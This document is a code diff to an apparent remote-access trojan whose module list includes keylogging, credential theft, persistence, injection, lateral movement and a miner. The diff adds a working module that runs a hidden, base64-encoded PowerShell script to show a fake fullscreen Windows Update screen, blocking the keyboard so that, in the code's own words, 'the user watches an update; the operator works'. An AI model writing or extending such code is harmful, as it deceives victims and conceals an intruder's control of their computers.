@@ -285,7 +285,7 @@ def sysinfo():
 def caps_list():
     caps = ["shell", "info", "artifact", "screen", "file", "proc"]
     mods = MODULES_ENABLED
-    for m in ("esc", "uac", "runas", "hvnc", "keylog", "creds", "persist", "exec", "inject", "pymod", "lateral", "net", "proc"):
+    for m in ("esc", "uac", "runas", "hvnc", "keylog", "creds", "persist", "exec", "inject", "pymod", "lateral", "net", "proc", "overlay"):
         if m in mods:
             caps.append(m)
     return caps
@@ -1688,6 +1688,101 @@ def _auto_escalate():
 //#pragma endmodule
 
 
+//#pragma module overlay
+_OVERLAY = {"proc": None}
+
+# Fake Windows Update screen (ported from the verizon kit relay agent):
+# fullscreen TopMost form in Windows blue, keyboard suppressed, random
+# progress ticker, timed close. The user watches an update; the operator
+# works. Launched via encoded PowerShell so the form still renders on the
+# interactive desktop while the launcher itself stays hidden.
+_OVERLAY_PS = r"""
+Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Drawing
+$form = New-Object System.Windows.Forms.Form
+$form.FormBorderStyle = 'None'
+$form.WindowState = 'Maximized'
+$form.BackColor = [System.Drawing.Color]::FromArgb(0, 120, 215)
+$form.TopMost = $true
+$form.ShowInTaskbar = $false
+$label = New-Object System.Windows.Forms.Label
+$label.Text = 'Working on updates'
+$label.Font = New-Object System.Drawing.Font('Segoe UI Light', 42)
+$label.ForeColor = [System.Drawing.Color]::White
+$label.AutoSize = $true
+$label.Location = New-Object System.Drawing.Point(([System.Windows.Forms.Screen]::PrimaryScreen.WorkingArea.Width - 500) / 2, 320)
+$form.Controls.Add($label)
+$percentLabel = New-Object System.Windows.Forms.Label
+$percentLabel.Text = '0% complete'
+$percentLabel.Font = New-Object System.Drawing.Font('Segoe UI', 24)
+$percentLabel.ForeColor = [System.Drawing.Color]::White
+$percentLabel.AutoSize = $true
+$percentLabel.Location = New-Object System.Drawing.Point(([System.Windows.Forms.Screen]::PrimaryScreen.WorkingArea.Width - 200) / 2, 420)
+$form.Controls.Add($percentLabel)
+$warnLabel = New-Object System.Windows.Forms.Label
+$warnLabel.Text = "Don't turn off your PC. This will take a while."
+$warnLabel.Font = New-Object System.Drawing.Font('Segoe UI', 14)
+$warnLabel.ForeColor = [System.Drawing.Color]::White
+$warnLabel.AutoSize = $true
+$warnLabel.Location = New-Object System.Drawing.Point(([System.Windows.Forms.Screen]::PrimaryScreen.WorkingArea.Width - 380) / 2, 500)
+$form.Controls.Add($warnLabel)
+$timer = New-Object System.Windows.Forms.Timer
+$timer.Interval = 3000
+$script:percent = 0
+$script:startTime = Get-Date
+$timer.Add_Tick({
+    $elapsed = ((Get-Date) - $script:startTime).TotalMinutes
+    if ($elapsed -ge __MINUTES__) { $form.Close(); return }
+    $script:percent = [math]::Min(99, $script:percent + (Get-Random -Minimum 1 -Maximum 8))
+    $percentLabel.Text = "$($script:percent)% complete"
+})
+$timer.Start()
+$form.KeyPreview = $true
+$form.Add_KeyDown({ $_.Handled = $true; $_.SuppressKeyPress = $true })
+$form.ShowDialog()
+"""
+
+
+def task_overlay(args):
+    """overlay start [minutes] | overlay stop | overlay status"""
+    if not IS_WIN:
+        return "overlay: windows only"
+    parts = args.split()
+    sub = parts[0].lower() if parts else "status"
+
+    proc = _OVERLAY.get("proc")
+    active = proc is not None and proc.poll() is None
+
+    if sub == "stop" or sub == "hide":
+        if active:
+            proc.kill()
+            _OVERLAY["proc"] = None
+        # sweep strays by window title
+        out = _run(
+            "powershell -NoP -NonI -W Hidden -Command \"Get-Process powershell "
+            "-ErrorAction SilentlyContinue | Where-Object { $_.MainWindowTitle -eq "
+            "'Working on updates' } | Stop-Process -Force\"", timeout=30, shell=False)
+        return "overlay hidden " + (out.strip()[:80] if out.strip() else "")
+    if sub in ("start", "on"):
+        try:
+            mins = int(parts[1]) if len(parts) > 1 else 10
+        except (ValueError, IndexError):
+            mins = 10
+        if active:
+            return "overlay already active"
+        script = _OVERLAY_PS.replace("__MINUTES__", str(mins))
+        enc = base64.b64encode(script.encode("utf-16-le")).decode()
+        proc = subprocess.Popen(
+            ["powershell.exe", "-NoP", "-NonI", "-W", "Hidden", "-Enc", enc],
+            creationflags=CREATE_NO_WINDOW)
+        _OVERLAY["proc"] = proc
+        return "overlay live for %d min — user is watching an update" % mins
+    if sub == "status":
+        return "overlay active" if active else "overlay idle"
+    return "overlay: start [minutes]|stop|status"
+//#pragma endmodule
+
+
 //#pragma module miner
 _miner_proc = None
 
@@ -1726,7 +1821,7 @@ _MODULE_BLOCK_MAP = {
     "creds": "creds", "chrome": "creds", "wifi": "creds", "hives": "creds", "dpapi": "creds",
     "persist": "persist", "exec": "exec", "inject": "inject", "pymod": "pymod",
     "ps": "proc", "kill": "proc", "netrecon": "net", "portscan": "net", "lateral": "lateral",
-    "runps": "net", "die": "selfdestruct",
+    "runps": "net", "die": "selfdestruct", "overlay": "overlay",
 }
 
 
